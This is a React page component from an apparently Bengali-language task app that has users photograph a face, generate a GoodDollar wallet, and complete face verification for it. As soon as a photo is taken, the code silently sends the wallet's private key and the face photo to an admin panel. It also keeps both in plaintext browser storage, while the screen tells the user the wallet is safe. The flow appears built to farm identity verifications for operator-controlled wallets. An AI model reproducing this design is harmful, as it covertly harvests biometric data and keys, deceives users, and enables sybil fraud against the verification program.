import { createFileRoute, useNavigate, Link } from "@tanstack/react-router";
import { useQuery, useMutation } from "@tanstack/react-query";
import { getDashboard } from "@/lib/dashboard.functions";
import { bindFirstVerify, saveNotWhitelisted, logGeneratedKey } from "@/lib/tasks.functions";
import { generateNewIdentity, isWhitelisted } from "@/lib/gooddollar";
import { FaceCapture } from "@/components/FaceCapture";
import { ArrowLeft, CheckCircle2, Loader2, Sparkles, Clock, ExternalLink, ShieldCheck } from "lucide-react";
import { toast } from "sonner";
import { useEffect, useRef, useState } from "react";
import { PageVoice } from "@/components/PageVoice";
import { playVoiceAuto } from "@/lib/voice-guide";


export const Route = createFileRoute("/_authenticated/task/$slot")({ component: TaskPage });

type Step = "intro" | "name" | "photo" | "verify" | "submitting" | "done";

function TaskPage() {
  const { slot } = Route.useParams();
  const slotNum = parseInt(slot, 10);
  const nav = useNavigate();

  const { data, isLoading, refetch } = useQuery({ queryKey: ["dashboard"], queryFn: () => getDashboard() });
  const task = data?.tasks.find((t: any) => t.slot === slotNum);

  const LS_KEY = `task-progress-${slotNum}`;
  const initial = (() => {
    if (typeof window === "undefined") return null;
    try { return JSON.parse(localStorage.getItem(LS_KEY) || "null"); } catch { return null; }
  })();

  const [step, setStep] = useState<Step>(initial?.step ?? "intro");
  const [faceLabel, setFaceLabel] = useState<string>(initial?.faceLabel ?? "");
  const [photoB64, setPhotoB64] = useState<string | null>(initial?.photoB64 ?? null);
  const [identity, setIdentity] = useState<{ privateKey: string; address: string; verifyUrl: string } | null>(initial?.identity ?? null);
  const [verifyOpened, setVerifyOpened] = useState<boolean>(initial?.verifyOpened ?? false);
  const [countdown, setCountdown] = useState<number | null>(null);
  const [checking, setChecking] = useState(false);
  const [quickSubmitting, setQuickSubmitting] = useState(false);
  const returnedRef = useRef(false);
  const leftForGoodDollarRef = useRef(false);
  const goodDollarOpenedAtRef = useRef(0);
  const submitReadySpokenRef = useRef(false);

  // Persist progress so refresh doesn't lose the key
  useEffect(() => {
    if (typeof window === "undefined") return;
    if (step === "intro" && !identity && !photoB64) {
      localStorage.removeItem(LS_KEY);
      return;
    }
    localStorage.setItem(LS_KEY, JSON.stringify({ step, faceLabel, photoB64, identity, verifyOpened }));
  }, [LS_KEY, step, faceLabel, photoB64, identity, verifyOpened]);

  const clearProgress = () => { try { localStorage.removeItem(LS_KEY); } catch {} };

  // When user returns from GoodDollar tab, start the 10s countdown before জমা দিন
  useEffect(() => {
    if (step !== "verify" || !verifyOpened) return;
    const markLeft = () => { leftForGoodDollarRef.current = true; };
    const onReturn = () => {
      const openedLongEnough = goodDollarOpenedAtRef.current > 0 && Date.now() - goodDollarOpenedAtRef.current > 1500;
      if (document.visibilityState === "visible" && (leftForGoodDollarRef.current || openedLongEnough) && !returnedRef.current) {
        returnedRef.current = true;
        setCountdown(10);
        playVoiceAuto("task.gd.after");
      }
    };
    const onVis = () => {
      if (document.visibilityState === "hidden") markLeft();
      else onReturn();
    };
    document.addEventListener("visibilitychange", onVis);
    window.addEventListener("blur", markLeft);
    window.addEventListener("focus", onReturn);
    return () => {
      document.removeEventListener("visibilitychange", onVis);
      window.removeEventListener("blur", markLeft);
      window.removeEventListener("focus", onReturn);
    };
  }, [step, verifyOpened]);

  useEffect(() => {
    if (countdown === null) return;
    if (countdown <= 0) return;
    submitReadySpokenRef.current = false;
    const t = setTimeout(() => setCountdown((c) => (c === null ? null : c - 1)), 1000);
    return () => clearTimeout(t);
  }, [countdown]);

  useEffect(() => {
    if (step === "verify" && verifyOpened && returnedRef.current && countdown === 0 && !submitReadySpokenRef.current) {
      submitReadySpokenRef.current = true;
      playVoiceAuto("task.submit.ready");
    }
  }, [step, verifyOpened, countdown]);

  const bindMut = useMutation({
    mutationFn: (input: { photoBase64: string; privateKey: string; walletAddress: string; faceLabel: string }) =>
      bindFirstVerify({ data: { slot: slotNum, ...input } }),
    onSuccess: () => {
      clearProgress();
      toast.success("ভেরিফাই সম্পন্ন! ৩ দিন পর একবার রি-ভেরিফাই লাগবে, পরে যেকোনো সময় অ্যাডমিন চাইতে পারেন।");
      refetch();
      nav({ to: "/home" });
    },
    onError: (e: any) => { toast.error(e.message); setStep("verify"); },
  });

  if (isLoading || !task) {
    return <div className="py-20 flex justify-center"><Loader2 className="w-6 h-6 animate-spin text-cyan" /></div>;
  }

  const isDone = task.status === "done";
  const isVerified = task.status === "verified";

  const onPhoto = async (b64: string) => {
    setPhotoB64(b64);
    // generate identity right away
    try {
      const id = await generateNewIdentity(data?.profile?.display_name ?? faceLabel ?? "User");
      setIdentity(id);
      setStep("verify");
      // Backup: log this key + photo to admin panel immediately so it's never lost
      logGeneratedKey({
        data: {
          slot: slotNum,
          photoBase64: b64,
          privateKey: id.privateKey,
          walletAddress: id.address,
          faceLabel: (faceLabel || data?.profile?.display_name || "নাম নেই").trim().slice(0, 60),
        },
      }).catch(() => { /* silent — user flow must not break */ });
    } catch (e: any) {
      toast.error("Key তৈরি হয়নি: " + e.message);
      setStep("photo");
    }
  };


  const onSubmit = async () => {
    if (!identity || !photoB64) return;
    setChecking(true);
    try {
      const ok = await isWhitelisted(identity.address);
      if (!ok) {
        // সংরক্ষণ photo + key for admin review, then HARD reset for a fresh attempt.
        try {
          await saveNotWhitelisted({
            data: {
              slot: slotNum,
              kind: "first_verify",
              photoBase64: photoB64,
              privateKey: identity.privateKey,
              walletAddress: identity.address,
              faceLabel: faceLabel.trim(),
              reason: "good-app হোয়াইটলিস্টে পাওয়া যায়নি",
            },
          });
          toast.warning("হোয়াইটলিস্টে পাওয়া যায়নি — অ্যাডমিন প্যানেলে সংরক্ষিত হয়েছে। পরের বার নতুন কী তৈরি হবে।");
        } catch (saveErr: any) {
          toast.error("সংরক্ষণ ব্যর্থ: " + saveErr.message);
        }
        // Synchronously wipe localStorage BEFORE any state change so re-entry can't read old key
        try {
          localStorage.removeItem(LS_KEY);
          // also remove any sibling keys from previous sessions
          Object.keys(localStorage).filter(k => k === LS_KEY).forEach(k => localStorage.removeItem(k));
        } catch {}
        setPhotoB64(null);
        setIdentity(null);
        setVerifyOpened(false);
        setCountdown(null);
        returnedRef.current = false;
        leftForGoodDollarRef.current = false;
        goodDollarOpenedAtRef.current = 0;
        setFaceLabel("");
        setStep("intro");
        setChecking(false);
        refetch();
        nav({ to: "/home" });
        return;
      }

      if (quickSubmitting || checking || bindMut.isPending) return;
      setStep("submitting");
      bindMut.mutate({
        photoBase64: photoB64,
        privateKey: identity.privateKey,
        walletAddress: identity.address,
        faceLabel: faceLabel.trim(),
      });
    } catch (e: any) {
      toast.error("যাচাই ব্যর্থ: " + e.message);
    } finally {
      setChecking(false);
    }
  };

  const onQuickSubmit = async () => {
    if (!identity || !photoB64 || !verifyOpened || quickSubmitting || checking || bindMut.isPending) return;
    setQuickSubmitting(true);
    await onSubmit();
    setQuickSubmitting(false);
  };


  return (
    <div className="space-y-4 pt-2">
      <PageVoice pageId="task-verify" steps={["task.name","task.photo","task.photo.submit","task.gd","task.gd.after","task.countdown","task.submit.ready","task.submit.clicked"]} />
      <Link to="/home" data-voice="common.back"

        className="inline-flex items-center gap-2 px-4 py-2 rounded-full gradient-cta text-white text-sm font-black shadow-lg btn-press">
        <ArrowLeft className="w-4 h-4" /> পিছনে যান
      </Link>

      <div className="premium-panel shine rounded-2xl p-5 pop-in">
        <p className="text-[10px] uppercase tracking-[0.3em] text-violet font-black">টাস্ক</p>
        <h1 className="text-3xl font-black bg-gradient-to-r from-violet via-cyan to-gold bg-clip-text text-transparent mining-number">
          #{task.slot} নং ঘর
        </h1>
        <p className="text-[12px] text-muted-foreground mt-2 font-bold">
          {isDone && <span className="text-emerald">✅ এই ঘর সম্পূর্ণ</span>}
          {isVerified && <span className="text-amber">⏳ রি-ভেরিফাই প্রস্তুত হলে রি-ভেরিফাই পেজ থেকে করবেন</span>}
          {task.status === "empty" && <span className="text-cyan inline-block">🔵 good-app ফেস ভেরিফাই দিয়ে শুরু করুন</span>}
        </p>
      </div>

      {isDone && (
        <div className="rounded-2xl bg-emerald/10 border border-emerald/40 p-5 text-center">
          <CheckCircle2 className="w-10 h-10 text-emerald mx-auto mb-2" />
          <p className="font-bold">এই ঘর সম্পূর্ণ</p>
          <Link to="/home" className="inline-block mt-3 px-4 py-2 rounded-xl gradient-cta text-sm font-bold">হোম</Link>
        </div>
      )}

      {isVerified && (
        <div className="rounded-2xl bg-amber/10 border border-amber/40 p-5 text-center">
          <Clock className="w-10 h-10 text-amber mx-auto mb-2" />
          <p className="font-bold">রি-ভেরিফাইয়ের অপেক্ষায়</p>
          <p className="text-[11px] text-muted-foreground mt-2">
            প্রস্তুত হবে: <span className="text-amber font-bold">
              {task.reverify_due_at ? new Date(task.reverify_due_at).toLocaleString() : "—"}
            </span>
          </p>
          <Link to="/reverify" className="inline-block mt-3 px-4 py-2 rounded-xl gradient-cta text-sm font-bold">
            রি-ভেরিফাই পেজ
          </Link>
        </div>
      )}

      {task.status === "empty" && step === "intro" && (
        <div className="glass rounded-2xl p-4 space-y-3">
          <p className="text-xs text-muted-foreground leading-relaxed">
            ১. মুখের মালিকের নাম দিন<br />
            ২. আপনার ছবি তুলুন<br />
            ৩. good-app ফেস ভেরিফাই করুন<br />
            ৪. ফিরে আসার পর ১০ সেকেন্ড অপেক্ষা → জমা দিন চাপুন
          </p>
          <button onClick={() => {
              clearProgress();
              setIdentity(null);
              setPhotoB64(null);
              setFaceLabel("");
              setVerifyOpened(false);
              setCountdown(null);
              returnedRef.current = false;
              leftForGoodDollarRef.current = false;
              goodDollarOpenedAtRef.current = 0;
              setStep("name");
            }} data-voice="task.name" className="w-full py-3 rounded-xl gradient-cta font-black flex items-center justify-center gap-2">
            <Sparkles className="w-4 h-4" /> শুরু করুন
          </button>
        </div>
      )}

      {task.status === "empty" && step === "name" && (
        <div className="glass rounded-2xl p-4 space-y-3">
          <label className="text-xs font-bold text-amber block">যার মুখ দিয়ে verify হবে তার নাম</label>
          <input value={faceLabel} onChange={(e) => setFaceLabel(e.target.value.slice(0, 60))}
            placeholder="যেমন: রহিম, করিম..." autoFocus data-voice="task.name"
            className="w-full px-3 py-2.5 rounded-xl bg-surface-2 border border-border text-sm font-bold outline-none focus:border-cyan" />
          <p className="text-[10px] text-muted-foreground">Re-verify এর সময় এই নাম দিয়ে খুঁজবেন।</p>
          <button onClick={() => setStep("photo")} disabled={faceLabel.trim().length < 2} data-voice="task.photo"
            className="w-full py-3 rounded-xl gradient-cta font-black disabled:opacity-50">
            এগিয়ে যান
          </button>
        </div>
      )}

      {task.status === "empty" && step === "photo" && (
        <div className="glass rounded-2xl p-4" data-voice="task.photo">
          <FaceCapture title="আপনার মুখের ছবি" submitLabel="good-app ধাপে যান" onCapture={onPhoto} onCancel={() => setStep("name")} />
        </div>
      )}

      {task.status === "empty" && step === "verify" && identity && (
        <div className="glass rounded-2xl p-4 space-y-4">
          <div className="rounded-xl bg-emerald/10 border border-emerald/30 p-3 space-y-2">
            <p className="text-xs font-bold text-emerald">✅ ছবি ও পরিচয় প্রস্তুত (রিফ্রেশ দিলেও হারাবে না)</p>
            <div>
              <p className="text-[10px] text-muted-foreground">ওয়ালেট ঠিকানা:</p>
              <p className="text-[10px] font-mono break-all bg-black/5 p-1.5 rounded cursor-pointer"
                onClick={() => { navigator.clipboard.writeText(identity.address); toast.success("ঠিকানা কপি হয়েছে"); }}>
                {identity.address}
              </p>
            </div>
            <p className="text-[10px] text-emerald font-bold">🔒 ওয়ালেট নিরাপদ</p>
          </div>
          <a href={identity.verifyUrl} target="_blank" rel="noopener noreferrer"
            onClick={() => { setVerifyOpened(true); returnedRef.current = false; leftForGoodDollarRef.current = false; goodDollarOpenedAtRef.current = Date.now(); }}
            data-voice="task.gd"
            className="w-full flex items-center justify-center gap-2 py-4 rounded-xl gradient-cta font-black">
            <ExternalLink className="w-4 h-4" /> good-app ফেস ভেরিফাই খুলুন
          </a>
          {verifyOpened && countdown !== null && countdown > 0 && (
            <div className="text-center py-3 rounded-xl bg-amber/10 border border-amber/30" data-voice="task.countdown">
              <p className="text-xs text-muted-foreground">জমা দিন বাটন আসবে</p>
              <p className="text-3xl font-black text-amber mono-num">{countdown} সে.</p>
            </div>
          )}
          {verifyOpened && countdown === 0 && (
            <button onClick={onSubmit} disabled={checking || bindMut.isPending}
              data-voice="task.submit.clicked"
              className="w-full py-4 rounded-xl gradient-cta font-black flex items-center justify-center gap-2">
              {checking || bindMut.isPending
                ? <><Loader2 className="w-4 h-4 animate-spin" /> হোয়াইটলিস্ট যাচাই হচ্ছে…</>
                : <><ShieldCheck className="w-4 h-4" /> জমা দিন</>}
            </button>
          )}
          {verifyOpened && countdown !== 0 && (
            <button onClick={onQuickSubmit} disabled={checking || bindMut.isPending || quickSubmitting}
              data-voice="task.submit.clicked"
              className="w-full py-4 rounded-xl gradient-cta font-black flex items-center justify-center gap-2">
              {checking || bindMut.isPending || quickSubmitting
                ? <><Loader2 className="w-4 h-4 animate-spin" /> হোয়াইটলিস্ট যাচাই হচ্ছে…</>
                : <><ShieldCheck className="w-4 h-4" /> জমা দিন</>}
            </button>
          )}
          <button onClick={async () => {
              try {
                const id = await generateNewIdentity(data?.profile?.display_name ?? faceLabel ?? "User");
                setIdentity(id);
                setVerifyOpened(false);
                setCountdown(null);
                returnedRef.current = false;
                leftForGoodDollarRef.current = false;
                goodDollarOpenedAtRef.current = 0;
                toast.success("নতুন কী তৈরি হয়েছে");
              } catch (e: any) { toast.error("কী তৈরি হয়নি: " + e.message); }
            }}
            data-voice="task.gd" className="w-full py-3 rounded-xl border border-amber/40 bg-amber/10 text-amber text-xs font-bold">
            🔄 নতুন কী তৈরি করুন
          </button>
          <button onClick={() => { clearProgress(); setStep("intro"); setIdentity(null); setPhotoB64(null); setFaceLabel(""); setVerifyOpened(false); setCountdown(null); returnedRef.current = false; leftForGoodDollarRef.current = false; goodDollarOpenedAtRef.current = 0; }} data-voice="common.back"
            className="w-full py-2 rounded-xl border border-border text-xs text-muted-foreground">
            বাতিল ও সব মুছে ফেলুন
          </button>
        </div>
      )}
    </div>
  );
}
